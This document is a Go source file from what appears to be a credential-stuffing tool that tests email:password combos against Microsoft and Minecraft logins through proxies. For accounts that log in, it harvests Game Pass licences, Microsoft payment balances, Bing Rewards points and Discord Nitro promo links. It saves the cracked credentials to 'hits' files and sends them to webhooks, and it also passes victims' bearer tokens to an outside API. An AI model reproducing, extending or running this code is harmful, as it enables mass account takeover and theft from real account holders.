package main

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"sync/atomic"
	"time"
)

func checkAccount(email, password, proxyURL string, cfg *Config) {
	atomic.AddInt64(&totalChecked, 1)
	client := buildHTTPClient(proxyURL)

	mcToken, profile, err := fullAuth(email, password, proxyURL)
	if err != nil {
		ce := categorizeAuthError(err)
		ts := time.Now().Format("15:04:05")

		switch ce.Category {
		case "INVALID_CREDENTIALS":
			atomic.AddInt64(&invalidCount, 1)
			writeToFile("invalid.txt", fmt.Sprintf("[%s] %s:%s | %s", ts, email, password, ce.Message))
			fmt.Printf("\n  [INVALID] %s:%s | %s", email, password, ce.Message)

		case "LOCKED":
			atomic.AddInt64(&lockedCount, 1)
			line := fmt.Sprintf("[%s] [LOCKED] %s:%s | %s", ts, email, password, ce.Detail)
			writeToFile("ms_valid.txt", line)
			fmt.Printf("\n  [LOCKED] %s:%s | %s", email, password, ce.Detail)

		case "RATE_LIMITED":
			if cfg.RetryRateLimited {
				fmt.Printf("\n  [RATE_LIMITED] Retrying %s...", email)
				mcToken, profile, err = fullAuth(email, password, proxyURL)
				if err != nil {
					ce2 := categorizeAuthError(err)
					writeToFile("ms_valid.txt", fmt.Sprintf("[%s] [RATE_LIMITED] %s:%s | %s", ts, email, password, ce2.Detail))
					logError("errors.log", email, err)
					fmt.Printf("\n  [RATE_LIMITED] %s:%s | %s", email, password, ce2.Detail)
					return
				}
				fmt.Printf("\n  [OK] %s:%s | retry succeeded", email, password)
			} else {
				writeToFile("ms_valid.txt", fmt.Sprintf("[%s] [RATE_LIMITED] %s:%s", ts, email, password))
				fmt.Printf("\n  [RATE_LIMITED] %s:%s", email, password)
				return
			}

		case "VERIFY_REQUIRED":
			writeToFile("ms_valid.txt", fmt.Sprintf("[%s] [VERIFY] %s:%s", ts, email, password))
			fmt.Printf("\n  [VERIFY] %s:%s", email, password)

		case "TIMEOUT", "NETWORK":
			writeToFile("ms_valid.txt", fmt.Sprintf("[%s] [%s] %s:%s | %s", ts, ce.Category, email, password, ce.Detail))
			logError("network_errors.log", email, err)
			fmt.Printf("\n  [%s] %s:%s | %s", ce.Category, email, password, ce.Detail)

		default:
			writeToFile("ban_check_unknown_errors.txt", fmt.Sprintf("[%s] %s:%s | %s", ts, email, password, ce.Detail))
			logError("errors.log", email, err, proxyURL)
			fmt.Printf("\n  [ERROR] %s:%s | %s", email, password, ce.Detail)
		}
		return
	}

	if mcToken == nil {
		return
	}

	atomic.AddInt64(&validCount, 1)
	accessToken := mcToken.AccessToken

	username := "Unknown"
	uuid := ""
	if profile != nil {
		username = profile.Name
		uuid = profile.ID
	}

	resultLine := fmt.Sprintf("%s:%s | Username: %s | UUID: %s", email, password, username, uuid)
	writeToFile("valid_accounts.txt", resultLine)

	gamepassResult := ""
	if cfg.GamepassPC || cfg.GamepassUltimate {
		gp, err := checkGamepass(client, accessToken)
		if err != nil {
			logError("value_check_errors.log", email+" gamepass", err)
		}
		gamepassResult = gp
		if strings.Contains(gp, "game_pass_pc") || strings.Contains(gp, "ultimate") {
			atomic.AddInt64(&xgpuHits, 1)
			writeToFile("valid_xbox_codes.txt", fmt.Sprintf("%s:%s | %s", email, password, gp))
			if cfg.XboxHitsWebhook != "" {
				sendWebhook(cfg.XboxHitsWebhook, buildWebhookEmbed("Xbox Game Pass Hit", resultLine+" | "+gp, 0x00FF00))
			}
		}
	}

	msBalance := ""
	if cfg.MSRewards {
		bal, err := checkMSBalance(client, accessToken)
		if err != nil {
			logError("value_check_errors.log", email+" msbalance", err)
		}
		msBalance = bal
		if msBalance != "" && msBalance != "0" {
			writeToFile("ms_balance_hits.txt", fmt.Sprintf("%s:%s | Balance: %s", email, password, msBalance))
			fmt.Printf("\n  [BALANCE] %s | $%s\n", username, msBalance)
		}
	}

	rewardPoints := ""
	if cfg.MSRewards {
		rp, err := checkRewardPoints(client, accessToken)
		if err != nil {
			logError("value_check_errors.log", email+" rewardpoints", err)
		}
		rewardPoints = rp
		if rewardPoints != "" {
			writeToFile("reward_point_hits.txt", fmt.Sprintf("%s:%s | RP: %s", email, password, rewardPoints))
		}
	}

	if cfg.XboxPerks {
		perks, err := checkXboxPerks(client, accessToken)
		if err != nil {
			logError("value_check_errors.log", email+" perks", err)
		}
		if perks {
			writeToFile("valid_xbox_codes.txt", fmt.Sprintf("%s:%s | Xbox Perks: Yes", email, password))
			fmt.Printf("\n  [PERKS] %s\n", username)
		}
	}

	if cfg.NitroPromo {
		nitros, err := checkNitroPromos(client, accessToken)
		if err != nil {
			logError("value_check_errors.log", email+" nitro", err)
		}
		for _, n := range nitros {
			writeToFile("nitro_promo_links.txt", fmt.Sprintf("%s:%s | Nitro: %s", email, password, n))
		}
		if len(nitros) > 0 {
			atomic.AddInt64(&rpHits, 1)
		}
	}

	hypixelInfo := ""
	if cfg.HypixelCheck && uuid != "" {
		hInfo, err := checkHypixel(uuid, cfg.HypixelAPIKey)
		if err != nil {
			logError("value_check_errors.log", email+" hypixel", err)
		}
		hypixelInfo = hInfo

		if cfg.IncludeHypixel && hInfo != "" {
			writeToFile("hypixel_stats.txt", fmt.Sprintf("%s:%s | %s", email, password, hInfo))
		}
	}

	banInfo := ""
	if cfg.HypixelBan && username != "Unknown" {
		bi, err := checkHypixelBan(username, uuid, accessToken)
		if err != nil {
			logError("value_check_errors.log", email+" hypixelban", err)
		}
		banInfo = bi
		if strings.Contains(banInfo, "banned") {
			atomic.AddInt64(&hypixelBanned, 1)
			writeToFile("hypixel_ban.txt", fmt.Sprintf("%s:%s | %s | %s", email, password, username, banInfo))
			fmt.Printf("\n  [HYPIXEL] %s | %s", username, banInfo)
		} else if strings.Contains(banInfo, "unbanned") {
			atomic.AddInt64(&hypixelUnban, 1)
			writeToFile("hypixel_unban.txt", fmt.Sprintf("%s:%s | %s | %s", email, password, username, banInfo))
			fmt.Printf("\n  [HYPIXEL] %s | %s", username, banInfo)
		}
	}

	if cfg.Sniper {
		runSniper(client, accessToken, username)
	}

	allHitsLine := fmt.Sprintf("%s:%s | %s | GP: %s | RP: %s | Balance: %s | Hypixel: %s | Ban: %s",
		email, password, username, gamepassResult, rewardPoints, msBalance, hypixelInfo, banInfo)
	writeToFile("all_hits.txt", allHitsLine)

	if cfg.Webhook != "" || cfg.DefaultWebhook != "" {
		wh := cfg.Webhook
		if wh == "" {
			wh = cfg.DefaultWebhook
		}
		embed := buildAccountWebhookEmbed(email, password, username, uuid,
			gamepassResult, msBalance, rewardPoints, hypixelInfo)
		sendWebhook(wh, embed)
	}

	atomic.AddInt64(&mcHits, 1)

	if currentRunDir != "" {
		ref := fmt.Sprintf("%s:%s | %s | %s | GP: %s | Ban: %s\n", email, password, username, uuid, gamepassResult, banInfo)
		safeWrite(filepath.Join(currentRunDir, "minecraft", "all_mc_hits", "combos.txt"), ref)
		if strings.Contains(banInfo, "unbanned") {
			safeWrite(filepath.Join(currentRunDir, "minecraft", "hypixel_hits", "unbanned", "combos.txt"), ref)
		} else if strings.Contains(banInfo, "banned") {
			safeWrite(filepath.Join(currentRunDir, "minecraft", "hypixel_hits", "banned", "combos.txt"), ref)
		}
	}

	fmt.Printf("\n  [HIT] %s | %s | GP: %s\n", username, uuid, gamepassResult)
}

func resultsDir(cookieFile string) string {
	name := strings.TrimSuffix(filepath.Base(cookieFile), ".txt")
	name = strings.Map(func(r rune) rune {
		if r == '<' || r == '>' || r == ':' || r == '"' || r == '/' || r == '\\' || r == '|' || r == '?' || r == '*' {
			return '_'
		}
		return r
	}, name)
	return filepath.Join("results", name)
}

func ensureDir(dir string) {
	if err := os.MkdirAll(dir, 0755); err != nil {
		fmt.Fprintf(os.Stderr, "CRITICAL: Failed to create dir %s: %v\n", dir, err)
	}
}

func checkGamepass(client *http.Client, accessToken string) (string, error) {
	req, _ := http.NewRequest("GET",
		"https://api.minecraftservices.com/entitlements/license?requestId=UNKNOWN", nil)
	req.Header.Set("Authorization", "Bearer "+accessToken)
	req.Header.Set("User-Agent", UserAgent)

	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("gamepass request failed: %w", wrapNetError(err))
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return "", fmt.Errorf("gamepass API returned status %d", resp.StatusCode)
	}

	body, _ := io.ReadAll(resp.Body)
	var result struct {
		Items []struct {
			Name string `json:"name"`
		} `json:"items"`
	}
	if err := json.Unmarshal(body, &result); err != nil {
		return "", fmt.Errorf("gamepass parse failed: %w", err)
	}

	var flags []string
	for _, item := range result.Items {
		switch item.Name {
		case "product_minecraft":
			flags = append(flags, "Java")
		case "product_game_pass_pc":
			flags = append(flags, "GamePass_PC")
		case "minecraft_bedrock_gamepass":
			flags = append(flags, "Bedrock_GP")
		case "minecraft_java_gamepass":
			flags = append(flags, "Java_GP")
		case "game_minecraft_bedrock":
			flags = append(flags, "Bedrock")
		}
	}

	if len(flags) == 0 {
		return "No License", nil
	}
	return strings.Join(flags, ", "), nil
}

func checkMSBalance(client *http.Client, accessToken string) (string, error) {
	req, _ := http.NewRequest("GET",
		"https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-GB", nil)
	req.Header.Set("Authorization", "Bearer "+accessToken)
	req.Header.Set("User-Agent", UserAgent)

	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("ms balance request failed: %w", wrapNetError(err))
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return "", nil
	}

	body, _ := io.ReadAll(resp.Body)
	var result map[string]interface{}
	if err := json.Unmarshal(body, &result); err != nil {
		return "", nil
	}

	if items, ok := result["value"].([]interface{}); ok {
		for _, item := range items {
			if m, ok := item.(map[string]interface{}); ok {
				if balance, ok := m["balance"].(float64); ok && balance > 0 {
					return fmt.Sprintf("$%.2f", balance), nil
				}
			}
		}
	}
	return "", nil
}

func checkRewardPoints(client *http.Client, accessToken string) (string, error) {
	ts := fmt.Sprintf("%d", getCurrentTimestamp())
	reqURL := fmt.Sprintf("https://rewards.bing.com/api/getuserinfo?type=1&X-Requested-With=XMLHttpRequest&_=%s", ts)

	req, _ := http.NewRequest("GET", reqURL, nil)
	req.Header.Set("Authorization", "Bearer "+accessToken)
	req.Header.Set("X-Requested-With", "XMLHttpRequest")
	req.Header.Set("User-Agent", UserAgent)

	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("rewards request failed: %w", wrapNetError(err))
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	var result map[string]interface{}
	if err := json.Unmarshal(body, &result); err != nil {
		return "", nil
	}

	if points, ok := result["availablePoints"].(float64); ok && points > 0 {
		return fmt.Sprintf("%.0f", points), nil
	}
	if pts, ok := result["lifetimePointsRedeemed"].(float64); ok && pts > 0 {
		return fmt.Sprintf("%.0f lifetime", pts), nil
	}
	return "", nil
}

func checkXboxPerks(client *http.Client, accessToken string) (bool, error) {
	req, _ := http.NewRequest("GET", "https://profile.gamepass.com", nil)
	req.Header.Set("Authorization", "Bearer "+accessToken)
	req.Header.Set("User-Agent", UserAgent)

	resp, err := client.Do(req)
	if err != nil {
		return false, fmt.Errorf("xbox perks request failed: %w", wrapNetError(err))
	}
	defer resp.Body.Close()
	return resp.StatusCode == 200, nil
}

func checkNitroPromos(client *http.Client, accessToken string) ([]string, error) {
	req, _ := http.NewRequest("GET",
		"https://rewards.bing.com/redeem/orderdetails?orderId=PLACEHOLDER&sku=PLACEHOLDER&X-Requested-With=XMLHttpRequest", nil)
	req.Header.Set("Authorization", "Bearer "+accessToken)
	req.Header.Set("User-Agent", UserAgent)

	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("nitro promo request failed: %w", wrapNetError(err))
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	bodyStr := string(body)

	nitroRe := regexp.MustCompile(`discord\.com/gifts/([A-Za-z0-9]+)`)
	matches := nitroRe.FindAllStringSubmatch(bodyStr, -1)

	var links []string
	seen := make(map[string]bool)
	for _, m := range matches {
		link := "https://discord.com/gifts/" + m[1]
		if !seen[link] {
			seen[link] = true
			links = append(links, link)
		}
	}

	promoRe := regexp.MustCompile(`promos\.discord\.gg/([A-Za-z0-9]+)`)
	promoMatches := promoRe.FindAllStringSubmatch(bodyStr, -1)
	for _, m := range promoMatches {
		link := "https://promos.discord.gg/" + m[1]
		if !seen[link] {
			seen[link] = true
			links = append(links, link)
		}
	}

	return links, nil
}

func checkHypixel(uuid, apiKey string) (string, error) {
	if apiKey == "" {
		return "", fmt.Errorf("hypixel API key not configured")
	}
	req, _ := http.NewRequest("GET",
		fmt.Sprintf("https://api.hypixel.net/player?key=%s&uuid=%s", apiKey, uuid), nil)
	req.Header.Set("User-Agent", UserAgent)

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("hypixel request failed: %w", wrapNetError(err))
	}
	defer resp.Body.Close()

	var result map[string]interface{}
	body, _ := io.ReadAll(resp.Body)
	if err := json.Unmarshal(body, &result); err != nil {
		return "", fmt.Errorf("hypixel parse failed: %w", err)
	}

	if success, ok := result["success"].(bool); !ok || !success {
		return "", fmt.Errorf("hypixel API error: %s", result["cause"])
	}

	player, ok := result["player"].(map[string]interface{})
	if !ok || player == nil {
		return "hypixel: Never joined", nil
	}

	rank := "Non"
	if r, ok := player["rank"].(string); ok {
		rank = r
	} else if r, ok := player["newPackageRank"].(string); ok {
		rank = r
	} else if r, ok := player["monthlyPackageRank"].(string); ok && r != "NONE" {
		rank = r
	}

	networkLevel := 0.0
	if xp, ok := player["networkExp"].(float64); ok {
		networkLevel = xp / 10000
	}

	return fmt.Sprintf("hypixel: ok | Rank: [%s] | Level: %.0f", rank, networkLevel), nil
}

func runSniper(client *http.Client, accessToken, currentName string) {
	req, _ := http.NewRequest("GET", APIBaseURL+"/api/recovery/random", nil)
	req.Header.Set("Authorization", "Bearer "+accessToken)
	req.Header.Set("User-Agent", UserAgent)

	resp, err := client.Do(req)
	if err != nil {
		logError("sniper_errors.log", currentName, err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		logError("sniper_errors.log", currentName, fmt.Errorf("sniper returned status %d", resp.StatusCode))
		return
	}
	fmt.Printf("\n  [SNIPER] %s | Status: %d\n", currentName, resp.StatusCode)
}

func getCurrentTimestamp() int64 {
	return time.Now().UnixMilli()
}

func truncateStr(s string, max int) string {
	if len(s) <= max {
		return s
	}
	return s[:max] + "..."
}


